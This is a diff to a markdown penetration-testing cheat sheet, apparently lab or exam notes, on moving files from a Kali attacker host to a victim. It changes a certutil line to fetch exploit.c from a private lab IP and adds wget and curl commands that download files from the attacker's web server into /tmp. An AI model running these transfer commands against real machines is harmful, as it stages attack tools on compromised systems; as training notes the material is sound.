@@ -56,11 +56,11 @@ python3 -m http.server 80
 Hosts files at:
 `http://<KALI_IP>/<file>`
 
-
+192.168.45.240
 ### **Victim (Windows) — certutil** 
 
 ```cmd
-certutil.exe -f -urlcache http://<KALI_IP>/winPEASx64.exe winpeas.exe
+certutil.exe -f -urlcache http://192.168.45.240/exploit.c exploit.c
 ```
 
 - Downloads file
@@ -79,6 +79,22 @@ Best for:
 - payloads
     
 - tools
+
+### **Victim (Linux) — wget**
+
+```bash
+wget http://<KALI_IP>/<file>
+```
+→ Downloads file into current directory. Run from a writable location like `/tmp`.
+
+### **Victim (Linux) — curl**
+
+```bash
+curl http://<KALI_IP>/<file> -o <file>
+```
+→ Same as wget but requires `-o` to save to disk instead of printing to stdout.
+
+---
 
 ### **Victim (Windows) — PowerShell**
 ```powershell
